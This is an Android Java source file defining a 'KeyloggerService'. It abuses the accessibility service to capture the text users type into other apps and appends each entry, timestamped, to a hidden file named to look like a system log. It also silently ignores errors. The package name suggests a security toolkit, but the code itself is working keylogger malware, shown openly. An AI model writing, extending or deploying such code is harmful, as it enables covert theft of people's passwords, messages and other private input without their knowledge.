package com.security.ravan;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            // اصلاح خط: List<CharSequence> به String تبدیل کن
            if (event.getText() != null && event.getText().size() > 0) {
                String text = event.getText().toString();
                saveKeyStroke(text);
            }
        }
    }
    
    private void saveKeyStroke(String text) {
        try {
            File logFile = new File(getFilesDir(), ".system_keylog.txt");
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date());
            String log = timestamp + " | " + text + "\n";
            
            FileWriter fw = new FileWriter(logFile, true);
            fw.write(log);
            fw.close();
        } catch (Exception e) {}
    }
    
    @Override
    public void onInterrupt() {}
}
